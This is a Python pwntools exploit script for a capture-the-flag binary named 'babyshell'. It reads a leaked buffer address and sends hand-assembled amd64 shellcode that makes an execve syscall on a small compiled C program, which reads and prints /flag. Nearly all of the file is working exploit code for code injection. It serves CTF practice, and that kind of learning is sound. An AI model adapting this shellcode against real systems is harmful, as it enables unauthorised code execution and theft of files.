from pwn import *
import sys, os


class io:
    @classmethod
    def connect(cls):
        binary = sys.argv[0].split('.py')[0]
        if '/' in binary:
            binary = binary.split('/')[-1]
        binary = '/pwn/babyshell/' + binary
        cls.io = process(binary)
    @classmethod
    def readuntil(cls, x, timeout = None):
        return cls.readuntil_internal(x, time_out = timeout)
    @classmethod
    def readuntil_internal(cls, x, time_out):
        ret = cls.io.readuntil(x, timeout = time_out) if time_out else cls.io.readuntil(x)
        sys.stdout.write(ret)
        return ret
    @classmethod
    def write(cls, x):
        sys.stdout.write(x)
        cls.io.write(x)
    @classmethod
    def sendline(cls, x):
        cls.write(x + '\n')
    @classmethod
    def close(cls):
        cls.io.close()
    @classmethod
    def interactive(cls):
        cls.io.interactive()


def bxock_stdout():
    sys.stdout = open(os.devnull, 'w')

def restore_stdout():
    sys.stdout = sys.__stdout__

def make_c_file():
    name = '/tmp/A'
    c_file = r'''#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>

int main() {
	int fd = open("/flag", 0);
	char buf[100];
	read(fd, buf, sizeof(buf));
	printf("%s", buf);

	return 0;
}'''
    with open('a.c', 'w') as f:
        f.write(c_file)
    os.system('gcc a.c -o ' + name)
    return name


def main():
    sc = shellcraft.amd64
    context.arch = 'amd64'
    context.os = 'linux'

    name = make_c_file() + '\0'
    name = (8-len(name)) * '\90' + name

    io.connect()
    io.readuntil('bytes from stdin into ')
    addr = int(io.readuntil('\n').split('.')[0][2:], 16)

    pl = asm('mov rsi, rax\nmov rdx, rax\nmov al, 59')        # Starts with 0x48 0x89
    pl += asm('add cl, 1\n mov edi, ' + str(addr + 24 + 3))   # Starts with 0x80 0xc1
    pl += asm('nop\nsyscall\n'+'nop\n'*5)                     # Starts with 0x90 0x0f
    pl += name                                                # Starts with 0x90 0x90
    io.sendline(pl)

if __name__ == '__main__':
    main()
    io.interactive()
